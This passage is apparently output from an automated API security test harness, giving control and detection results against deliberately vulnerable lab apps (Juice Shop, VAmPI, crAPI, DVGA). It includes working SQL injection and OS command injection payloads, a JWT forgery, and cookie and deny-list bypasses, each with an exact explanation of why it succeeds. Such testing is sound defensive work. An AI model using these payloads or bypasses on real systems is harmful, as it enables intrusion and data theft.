  "evidence": "Basket 7 owned by 'attacker' was successfully retrieved using 'victim''s own valid token (HTTP 200). Response contained the owner's basket contents, confirming BOLA.",
  "request_summary": "GET /rest/basket/7 as_user='victim'",
  "response_summary": "HTTP 200; basket_leaked=True",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:18.136202+00:00",
  "extra": {
    "owner_role": "attacker",
    "requester_role": "victim",
    "basket_id": 7
  },
  "run_id": "20260714T093118Z_ac590b",
  "record_type": "result"
}
```

### Record 39: `bola_basket_access`

```json
{
  "test_name": "bola_basket_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "juiceshop",
  "passed": true,
  "severity": "low",
  "evidence": "Unauthenticated request for basket 6 was denied (HTTP 401).",
  "request_summary": "GET /rest/basket/6 as_user=None",
  "response_summary": "HTTP 401; basket_leaked=False",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:18.138268+00:00",
  "extra": {
    "owner_role": "victim",
    "requester_role": "unauthenticated",
    "basket_id": 6
  },
  "run_id": "20260714T093118Z_ac590b",
  "record_type": "result"
}
```


## Data Exposure/IDOR (Juice Shop)

### Record 40: `excessive_user_data_exposure`

```json
{
  "test_name": "excessive_user_data_exposure",
  "owasp_category": "API3:2023 Excessive Data Exposure",
  "architecture": "rest",
  "target": "juiceshop",
  "passed": false,
  "severity": "high",
  "evidence": "GET /rest/user/authentication-details as an ordinary, non-admin authenticated user -> HTTP 200 with 25 user record(s) in the response body. Contains 24 other account(s)' email addresses (e.g. 'admin@juice-sh.op'), which this requester has no legitimate reason to see. The 'password' field is masked to a constant placeholder ('********************************') for every record, not a real hash.",
  "request_summary": "GET /rest/user/authentication-details as_user='requester'",
  "response_summary": "HTTP 200; records=25; other_emails_leaked=24; unmasked_passwords=0",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:48.744856+00:00",
  "extra": {
    "other_emails_sample": [
      "admin@juice-sh.op",
      "jim@juice-sh.op",
      "bender@juice-sh.op"
    ]
  },
  "run_id": "20260714T093148Z_420a8d",
  "record_type": "result"
}
```

### Record 41: `excessive_user_data_exposure`

```json
{
  "test_name": "excessive_user_data_exposure",
  "owasp_category": "API3:2023 Excessive Data Exposure",
  "architecture": "rest",
  "target": "juiceshop",
  "passed": true,
  "severity": "low",
  "evidence": "Unauthenticated request to GET /rest/user/authentication-details -> HTTP 401. Rejected, as expected — authentication is enforced here; the exposure finding above is about excessive data returned to an authenticated, non-privileged user, not a missing auth check.",
  "request_summary": "GET /rest/user/authentication-details as_user=None",
  "response_summary": "HTTP 401",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:48.747007+00:00",
  "extra": {},
  "run_id": "20260714T093148Z_420a8d",
  "record_type": "result"
}
```


## Rate Limiting (VAmPI)

### Record 42: `login_brute_force_rate_limit`

```json
{
  "test_name": "login_brute_force_rate_limit",
  "owasp_category": "API4:2023 Unrestricted Resource Consumption",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "high",
  "evidence": "25 rapid login attempts against seeded username 'name1' with a wrong password -> status codes [200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200]. All 25 attempts returned the same un-throttled failure response (VAmPI's password-enumeration behaviour returns HTTP 200 with a 'Password is not correct' body rather than 401/403 — see api_views/users.py::login_user), with no HTTP 429, lockout, or CAPTCHA challenge, and no growth in response latency (min=0.003s, max=0.004s).",
  "request_summary": "POST /users/v1/login x25 (same wrong password)",
  "response_summary": "status_codes=[200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200]",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:32:01.681381+00:00",
  "extra": {
    "attempt_count": 25,
    "throttled_at_attempt": null
  },
  "run_id": "20260714T093201Z_099dff",
  "record_type": "result"
}
```


## Rate Limiting (crAPI)

### Record 43: `crapi_login_brute_force_rate_limit`

```json
{
  "test_name": "crapi_login_brute_force_rate_limit",
  "owasp_category": "API4:2023 Unrestricted Resource Consumption",
  "architecture": "rest",
  "target": "crapi",
  "passed": false,
  "severity": "high",
  "evidence": "25 rapid login attempts against a registered email with a wrong password -> status codes [401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401]. All 25 attempts returned the same un-throttled HTTP 401 'Invalid Credentials' response, with no HTTP 429, lockout, or CAPTCHA challenge, and no growth in response latency (min=0.090s, max=0.181s).",
  "request_summary": "POST /identity/api/auth/login x25 (same wrong password)",
  "response_summary": "status_codes=[401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401, 401]",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:32:04.573693+00:00",
  "extra": {
    "attempt_count": 25,
    "throttled_at_attempt": null
  },
  "run_id": "20260714T093201Z_8d792b",
  "record_type": "result"
}
```


## Auth Bypass (DVGA)

### Record 44: `jwt_token_forge`

```json
{
  "test_name": "jwt_token_forge",
  "owasp_category": "API2:2023 Broken Authentication",
  "architecture": "graphql",
  "target": "dvga",
  "passed": true,
  "severity": "low",
  "evidence": "me(token=<operator's own token>) -> HTTP 200, username='operator' (returned the caller's own record, as expected).",
  "request_summary": "query Me(token) as operator's own token",
  "response_summary": "HTTP 200; username='operator'",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:32:12.163295+00:00",
  "extra": {},
  "run_id": "20260714T093212Z_b19ab7",
  "record_type": "result"
}
```

### Record 45: `jwt_token_forge`

```json
{
  "test_name": "jwt_token_forge",
  "owasp_category": "API2:2023 Broken Authentication",
  "architecture": "graphql",
  "target": "dvga",
  "passed": false,
  "severity": "critical",
  "evidence": "me(token=<forged, identity='admin'>) -> HTTP 200. Returned 'admin''s record including a plaintext password ('changeme'), despite the token's signature never being verified and the caller never authenticating as that user — confirms JWT identity forgery.",
  "request_summary": "query Me(token) with forged identity='admin'",
  "response_summary": "HTTP 200; username='admin'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:32:12.216821+00:00",
  "extra": {
    "forged_identity": "admin"
  },
  "run_id": "20260714T093212Z_b19ab7",
  "record_type": "result"
}
```


## Auth Bypass (DVGA)

### Record 46: `query_deny_list_bypass`

```json
{
  "test_name": "query_deny_list_bypass",
  "owasp_category": "API5:2023 Broken Function Level Authorization",
  "architecture": "graphql",
  "target": "dvga",
  "passed": true,
  "severity": "low",
  "evidence": "query '{ systemHealth }' (no operationName) -> HTTP 200 (rejected by the deny list, as expected).",
  "request_summary": "POST /graphql query='{ systemHealth }'",
  "response_summary": "HTTP 200",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:32:12.389893+00:00",
  "extra": {},
  "run_id": "20260714T093212Z_b19ab7",
  "record_type": "result"
}
```

### Record 47: `query_deny_list_bypass`

```json
{
  "test_name": "query_deny_list_bypass",
  "owasp_category": "API5:2023 Broken Function Level Authorization",
  "architecture": "graphql",
  "target": "dvga",
  "passed": false,
  "severity": "high",
  "evidence": "query 'query getPastes {\\n  systemHealth\\n}\\n' with operationName='getPastes' -> HTTP 200. Returned 'System Load: 1.88\\n' — the deny list only exact-matches the raw query text against a fixed set of strings, so wrapping the same restricted field in an allow-listed operation name evades both the deny list and the operation-name allow list at once, reaching a diagnostic query meant to be blocked in hard difficulty.",
  "request_summary": "POST /graphql query='query getPastes {\\n  systemHealth\\n}\\n' operationName='getPastes'",
  "response_summary": "HTTP 200; systemHealth='System Load: 1.88\\n'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:32:12.490837+00:00",
  "extra": {},
  "run_id": "20260714T093212Z_b19ab7",
  "record_type": "result"
}
```


## Auth Bypass (DVGA)

### Record 48: `graphiql_interface_protection_bypass`

```json
{
  "test_name": "graphiql_interface_protection_bypass",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "graphql",
  "target": "dvga",
  "passed": true,
  "severity": "low",
  "evidence": "query '{ __typename }' via /graphiql with cookie env='graphiql:disable' -> HTTP 200, errors=[{'message': '400 Bad Request: GraphiQL Access Rejected', 'locations': [{'line': 1, 'column': 3}], 'path': ['__typename']}] (execution rejected, as expected).",
  "request_summary": "POST /graphiql query (server-set cookie)",
  "response_summary": "HTTP 200; blocked=True",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:32:12.280909+00:00",
  "extra": {},
  "run_id": "20260714T093212Z_b19ab7",
  "record_type": "result"
}
```

### Record 49: `graphiql_interface_protection_bypass`

```json
{
  "test_name": "graphiql_interface_protection_bypass",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "graphql",
  "target": "dvga",
  "passed": false,
  "severity": "medium",
  "evidence": "query '{ __typename }' via /graphiql with client-rewritten cookie env='graphiql:enable' -> HTTP 200, data={'__typename': 'Query'}. Query executed successfully through the GraphiQL route — the protection is a client-trusted cookie value with no server-side session check behind it, so any client can set it directly instead of relying on the app to issue it.",
  "request_summary": "POST /graphiql query (client-set cookie)",
  "response_summary": "HTTP 200; data={'__typename': 'Query'}",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:32:12.327984+00:00",
  "extra": {},
  "run_id": "20260714T093212Z_b19ab7",
  "record_type": "result"
}
```


## Injection (DVGA)

### Record 50: `pastes_filter_sqli`

```json
{
  "test_name": "pastes_filter_sqli",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "graphql",
  "target": "dvga",
  "passed": true,
  "severity": "low",
  "evidence": "pastes(public=true, filter='nonexistent_780d7fa588') -> HTTP 200. Private canary paste correctly excluded, as expected.",
  "request_summary": "query pastes(public=true, filter='nonexistent_780d7fa588')",
  "response_summary": "HTTP 200; titles=[]",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:32:21.963672+00:00",
  "extra": {},
  "run_id": "20260714T093221Z_c09fd3",
  "record_type": "result"
}
```

### Record 51: `pastes_filter_sqli`

```json
{
  "test_name": "pastes_filter_sqli",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "graphql",
  "target": "dvga",
  "passed": false,
  "severity": "critical",
  "evidence": "pastes(public=true, filter=\"nonexistent_2a9de0ceb4' OR '1'='1\") -> HTTP 200. Private canary paste 'sqli_canary_9c2f28a9752e' was returned despite requesting public=true and the filter value never literally matching its title or content — the filter argument is concatenated unsanitised into a raw SQL text() fragment with no parenthesisation, so the OR tautology outranks the surrounding public/burn filter_by() scoping by operator precedence, exposing every paste in the table regardless of its public flag. Confirms SQL injection (CWE-89) with no authentication required.",
  "request_summary": "query pastes(public=true, filter=\"nonexistent_2a9de0ceb4' OR '1'='1\")",
  "response_summary": "HTTP 200; titles=['sqli_canary_9c2f28a9752e', 'Testing Testing', 'Whoa this is cool', 'What is this even', 'Testing Testing', 'This is my first paste', 'Whoa this is cool', 'Testing Testing', 'What is this even', 'Whoa this is cool', 'What is this even', '555-555-1337', 'Testing Testing']",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:32:22.046028+00:00",
  "extra": {
    "payload": "nonexistent_2a9de0ceb4' OR '1'='1",
    "cwe": "CWE-89",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093221Z_c09fd3",
  "record_type": "result"
}
```

### Record 52: `system_debug_command_injection`

```json
{
  "test_name": "system_debug_command_injection",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "graphql",
  "target": "dvga",
  "passed": true,
  "severity": "low",
  "evidence": "systemDebug(arg='aux') -> HTTP 200 (ran cleanly, as expected).",
  "request_summary": "query systemDebug(arg='aux')",
  "response_summary": "HTTP 200",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:32:22.156216+00:00",
  "extra": {},
  "run_id": "20260714T093221Z_c09fd3",
  "record_type": "result"
}
```

### Record 53: `system_debug_command_injection`

```json
{
  "test_name": "system_debug_command_injection",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "graphql",
  "target": "dvga",
  "passed": false,
  "severity": "critical",
  "evidence": "systemDebug(arg='; echo cmdicanary2f4fda7c2034') -> HTTP 200. Random per-run canary 'cmdicanary2f4fda7c2034' was echoed back in the response, confirming arbitrary OS command execution — arg is passed directly into os.popen('ps {}'.format(arg)) with no sanitisation in either difficulty mode. Confirms OS command injection (CWE-78) with no authentication required.",
  "request_summary": "query systemDebug(arg='; echo cmdicanary2f4fda7c2034')",
  "response_summary": "HTTP 200; output='  PID TTY          TIME CMD\\n    1 ?        00:00:01 python\\n   16 ?        00:00:00 sh\\n   17 ?        00:00:00 ps\\ncmdicanary2f4fda7c2034\\n'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:32:22.251570+00:00",
  "extra": {
    "payload": "; echo cmdicanary2f4fda7c2034",
    "cwe": "CWE-78",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093221Z_c09fd3",
  "record_type": "result"
}
```


## Introspection exposure (DVGA)

### Record 54: `introspection_exposure`

```json
{
  "test_name": "introspection_exposure",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "graphql",
  "target": "dvga",
  "passed": true,
  "severity": "low",
  "evidence": "query '{ __schema { queryType { name } } }\\n' (hard mode) -> HTTP 200, errors=[{'message': '400 Bad Request: Introspection is Disabled', 'locations': [{'line': 1, 'column': 3}], 'path': ['__schema']}] (rejected, as expected).",
  "request_summary": "POST /graphql query='{ __schema { queryType { name } } }\\n' (hard mode)",
  "response_summary": "HTTP 200; blocked=True",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:32:42.175213+00:00",
  "extra": {},
  "run_id": "20260714T093242Z_aa799c",
  "record_type": "result"
}
```

### Record 55: `introspection_exposure`

```json
{
  "test_name": "introspection_exposure",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "graphql",
  "target": "dvga",
  "passed": false,
  "severity": "medium",
  "evidence": "query '{ __schema { queryType { name } } }\\n' (easy mode, the container's default) -> HTTP 200. Returned {'name': 'Query'} — introspection succeeds in the server's default difficulty mode, exposing the full schema (every query, mutation, and type) to an unauthenticated client with no prior reconnaissance needed.",
  "request_summary": "POST /graphql query='{ __schema { queryType { name } } }\\n' (easy mode)",
  "response_summary": "HTTP 200; queryType={'name': 'Query'}",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:32:42.232252+00:00",
  "extra": {},
  "run_id": "20260714T093242Z_aa799c",
  "record_type": "result"
}
```


## Field suggestion/info disclosure (DVGA)

### Record 56: `field_suggestion_info_disclosure`

```json
{
  "test_name": "field_suggestion_info_disclosure",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "graphql",
  "target": "dvga",
  "passed": true,
  "severity": "low",
  "evidence": "query '{ systemDebug }' (hard mode) -> HTTP 200, errors=None (resolved cleanly, as expected).",
  "request_summary": "POST /graphql query='{ systemDebug }' (hard mode)",
  "response_summary": "HTTP 200; errors=None",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:32:42.334508+00:00",
  "extra": {},
  "run_id": "20260714T093242Z_aa799c",
  "record_type": "result"
}
```

### Record 57: `field_suggestion_info_disclosure`

```json
{
  "test_name": "field_suggestion_info_disclosure",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "graphql",
  "target": "dvga",
  "passed": false,
  "severity": "medium",
  "evidence": "query '{ systemHealtx }' (hard mode) -> HTTP 400, message='Cannot query field \"systemHealtx\" on type \"Query\". Did you mean \"systemHealth\", \"systemUpdate\" or \"systemDebug\"?'. Error message suggests real field 'systemHealth' despite introspection being disabled in hard mode — graphql-core's field-suggestion behaviour runs during query validation, a phase that precedes DVGA's IntrospectionMiddleware entirely, so schema field names remain enumerable via deliberately misspelled queries even with introspection turned off.",
  "request_summary": "POST /graphql query='{ systemHealtx }' (hard mode)",
  "response_summary": "HTTP 400; message='Cannot query field \"systemHealtx\" on type \"Query\". Did you mean \"systemHealth\", \"systemUpdate\" or \"systemDebug\"?'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:32:42.383208+00:00",
  "extra": {},
  "run_id": "20260714T093242Z_aa799c",
  "record_type": "result"
}
```


## DoS — deep nesting (DVGA)

### Record 58: `deep_nesting_dos`

```json
{
  "test_name": "deep_nesting_dos",
  "owasp_category": "API4:2023 Unrestricted Resource Consumption",
  "architecture": "graphql",
  "target": "dvga",
  "passed": true,
  "severity": "low",
  "evidence": "query '{ pastes(public: true) { owner { pastes { title } } } }\\n' (hard mode, under MAX_DEPTH) -> HTTP 200, errors=None (allowed, as expected).",
  "request_summary": "POST /graphql query='{ pastes(public: true) { owner { pastes { title } } } }\\n' (hard mode)",
  "response_summary": "HTTP 200",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:32:52.400562+00:00",
  "extra": {},
  "run_id": "20260714T093252Z_a82511",
  "record_type": "result"
}
```

### Record 59: `deep_nesting_dos`

```json
{
  "test_name": "deep_nesting_dos",
  "owasp_category": "API4:2023 Unrestricted Resource Consumption",
  "architecture": "graphql",
  "target": "dvga",
  "passed": true,
  "severity": "low",
  "evidence": "query (depth-exceeding, cyclic owner/pastes chain) (hard mode) -> HTTP 200, message='400 Bad Request: Query Depth Exceeded! Deep Recursion Attack Detected.' (rejected, as expected).",
  "request_summary": "POST /graphql query=<deep_query> (hard mode)",
  "response_summary": "HTTP 200; message='400 Bad Request: Query Depth Exceeded! Deep Recursion Attack Detected.'",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:32:52.446952+00:00",
  "extra": {},
  "run_id": "20260714T093252Z_a82511",
  "record_type": "result"
}
```

### Record 60: `deep_nesting_dos`

```json
{
  "test_name": "deep_nesting_dos",
  "owasp_category": "API4:2023 Unrestricted Resource Consumption",
  "architecture": "graphql",
  "target": "dvga",
  "passed": false,
  "severity": "medium",
  "evidence": "query (same depth-exceeding, cyclic owner/pastes chain) (easy mode, the container's default) -> HTTP 200 in 0.212s. Executed in full with no depth limit in effect — response size grows combinatorially with each additional owner/pastes level rather than linearly, since each level expands a list. Whether a given depth constitutes a practical DoS is a matter of degree DVGA does not itself define a threshold for; this result establishes that no ceiling exists at all in the server's default mode, rather than asserting a specific resource-exhaustion outcome.",
  "request_summary": "POST /graphql query=<deep_query> (easy mode)",
  "response_summary": "HTTP 200; elapsed=0.212s",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:32:52.666532+00:00",
  "extra": {},
  "run_id": "20260714T093252Z_a82511",
  "record_type": "result"
}
```


## DoS — batch query (DVGA)

### Record 61: `batch_query_dos`

```json
{
  "test_name": "batch_query_dos",
  "owasp_category": "API4:2023 Unrestricted Resource Consumption",
  "architecture": "graphql",
  "target": "dvga",
  "passed": true,
  "severity": "low",
  "evidence": "Batch of 2 x '{ systemHealth }' -> HTTP 200, 2 response(s) (succeeded, as expected).",
  "request_summary": "POST /graphql batch(n=2) query='{ systemHealth }'",
  "response_summary": "HTTP 200",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:32:52.792003+00:00",
  "extra": {},
  "run_id": "20260714T093252Z_a82511",
  "record_type": "result"
}
```

### Record 62: `batch_query_dos`

```json
{
  "test_name": "batch_query_dos",
  "owasp_category": "API4:2023 Unrestricted Resource Consumption",
  "architecture": "graphql",
  "target": "dvga",
  "passed": false,
  "severity": "medium",
  "evidence": "Single '{ systemHealth }' -> HTTP 200 in 0.087s. Batch of 30 x '{ systemHealth }' in one request -> HTTP 200 in 1.276s, 30 response(s). Every element of the oversized batch executed and returned a result — no batch-size limit rejected or truncated the request. Total batch latency scaling with batch size (rather than being flat, as a size-capped or rate-limited endpoint would show) is offered as corroborating context, not the pass/fail signal itself: like DeepNestingDoSTest, the practical severity of a given batch size is a matter of degree this test does not attempt to quantify precisely — the finding is that no ceiling exists at all, in either difficulty mode.",
  "request_summary": "POST /graphql batch(n=30) query='{ systemHealth }'",
  "response_summary": "HTTP 200; elapsed=1.276s (single=0.087s)",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:32:54.155558+00:00",
  "extra": {},
  "run_id": "20260714T093252Z_a82511",
  "record_type": "result"
}
```
